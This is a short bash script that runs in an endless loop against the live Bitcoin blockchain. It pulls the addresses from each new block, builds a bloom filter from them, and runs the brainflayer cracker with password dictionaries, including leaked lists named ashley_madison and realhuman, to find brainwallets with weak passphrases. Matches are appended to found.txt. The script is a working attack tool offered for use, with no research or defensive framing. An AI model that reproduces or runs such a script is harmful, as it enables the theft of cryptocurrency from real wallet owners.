#!/bin/bash

while [ 1 ]
do 

#sleep 10

bitcoin-cli getblockcount

# script to apply passwords to all new transactions on bitcoin

# python routine to get most recent block and harvest all addresses

 python3 python/get-address4.py

cat base58.txt >> addr.txt

# change adresses to base 58 form, make-h160 addr.txt->addr.hex


# input is base58.txt ( addr.txt ), output is addr.hex, not that always concatenates


python python/make-hash160.py

# generate bloom filter from base58 addresses

brainflayer/hex2blf addr.hex addr.blf 

# apply brainflayer to bloom filter using dictionary of choice ashley_madison, realhuman,10k

# anything found?, append to found.txt file

# sort -u example.hex | xxd -r -p > example.bin

#brainflayer/brainflayer -b addr.blf -i brainflayer/realhuman_phill.txt -v  >> found.txt

#brainflayer/brainflayer -b hex.blf -i *.lst -v -m brainflayer/tablefile.tab -f example.bin >> found.txt

brainflayer/brainflayer -b addr.blf -i *.lst -v >> found.txt

sleep 10

done
